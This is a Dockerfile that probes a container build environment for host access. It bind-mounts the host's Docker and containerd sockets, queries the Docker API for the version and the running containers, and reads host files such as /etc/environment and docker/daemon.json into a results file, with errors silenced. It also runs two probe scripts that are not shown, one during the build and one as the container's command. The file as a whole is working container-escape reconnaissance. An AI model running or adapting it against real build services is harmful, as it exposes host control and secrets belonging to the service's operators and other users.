# syntax=docker/dockerfile:1
FROM python:3-alpine
RUN apk add --no-cache curl iproute2 net-tools nmap-ncat

# Test 1: BuildKit bind mount to docker.sock (host filesystem)
RUN --mount=type=bind,source=/var/run/docker.sock,target=/mnt/docker.sock \
    echo "=== DOCKER SOCKET MOUNT TEST ===" > /build-results.txt && \
    ls -la /mnt/docker.sock >> /build-results.txt 2>&1 && \
    curl -s -m 5 --unix-socket /mnt/docker.sock http://localhost/version >> /build-results.txt 2>&1 && \
    echo "" >> /build-results.txt && \
    curl -s -m 5 --unix-socket /mnt/docker.sock 'http://localhost/containers/json' >> /build-results.txt 2>&1 ; \
    true

# Test 2: Alternative socket paths
RUN --mount=type=bind,source=/run/docker.sock,target=/mnt/docker2.sock \
    echo "=== ALT SOCKET ===" >> /build-results.txt && \
    curl -s -m 3 --unix-socket /mnt/docker2.sock http://localhost/version >> /build-results.txt 2>&1 ; \
    true

# Test 3: containerd socket
RUN --mount=type=bind,source=/run/containerd/containerd.sock,target=/mnt/containerd.sock \
    echo "=== CONTAINERD SOCKET ===" >> /build-results.txt && \
    ls -la /mnt/containerd.sock >> /build-results.txt 2>&1 ; \
    true

# Test 4: host /etc/environment, /proc from host via mount
RUN --mount=type=bind,source=/etc,target=/host-etc,readonly \
    echo "=== HOST /etc ===" >> /build-results.txt && \
    cat /host-etc/hostname >> /build-results.txt 2>&1 && \
    cat /host-etc/environment >> /build-results.txt 2>&1 && \
    cat /host-etc/docker/daemon.json >> /build-results.txt 2>&1 && \
    ls /host-etc/docker/ >> /build-results.txt 2>&1 ; \
    true

# Fallback: regular build probe with host networking
COPY build-probe.sh /tmp/build-probe.sh
RUN chmod +x /tmp/build-probe.sh && /tmp/build-probe.sh ; true

WORKDIR /app
COPY probe.sh /app/
RUN chmod +x /app/probe.sh
EXPOSE 8080
CMD ["/app/probe.sh"]
